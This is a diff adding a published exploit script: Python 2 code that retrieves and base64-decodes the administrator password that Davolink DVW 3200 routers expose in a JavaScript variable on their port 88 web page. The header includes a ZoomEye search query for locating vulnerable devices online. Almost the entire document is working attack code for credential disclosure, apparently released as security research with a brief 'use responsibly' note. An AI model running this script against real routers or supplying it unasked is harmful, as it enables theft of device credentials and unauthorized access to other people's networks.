@@ -1,0 +1,43 @@
+# Exploit Title: Davolink DVW 3200 Router - Password Disclosure
+# Google Dork: N/A
+# Zoomeye dork : https://www.zoomeye.org/searchResult?q=%22var%20user_passwd%22%20%2Bapp%3A%22DAVOLINK%20GAPD-7000%20WAP%20httpd%22 
+# Date: 2018-07-13
+# Exploit Author: Ankit Anubhav
+# Vendor Homepage: www.davolink.co.kr
+# Software Link: N/A
+# Version: DVW 3200
+# Tested on: Python 2.7 Windows 10
+# CVE : N/A
+
+# Many Davolink Davolink DV 3200 devices credentials can be disclosed using the following script.
+# Author : Ankit Anubhav (ankitanubhav.com)  of NewSky Security ( https://www.newskysecurity.com/ )
+
+# Usage script.py 1.3.3.7 where 1.3.3.7 is the Davolink DV 3200 IP.
+# Use responsibly only for research and testing purposes.
+# Tested with python 2.7
+
+import sys
+import urllib2
+import re
+import base64
+
+def davolink_credfinder(ip):
+        try:
+		req = urllib2.Request('http://' + ip + ':' + '88', headers={ 'User-Agent': 'Mozilla/5.0' })
+		connection_check = str(urllib2.urlopen(req).getcode())
+
+		if (connection_check == "200"):
+			html = urllib2.urlopen(req).read()
+			str_html = str(html)
+			m=re.compile('var user\_passwd\=\"(.*?)\"').search(str_html)
+			encoded_pwd =str(m.group(1))
+			actual_pwd = base64.b64decode(encoded_pwd)
+			print "**************************************************************************************************"
+			print "The password for the Davolink device is " + actual_pwd
+			print "**************************************************************************************************"
+	        else:
+			print "Connection to port 88 was not successful. Cant find credentials,sorry." 
+	except:
+		print "There was an error in connecting to the IP." 
+
+davolink_credfinder(sys.argv[1])
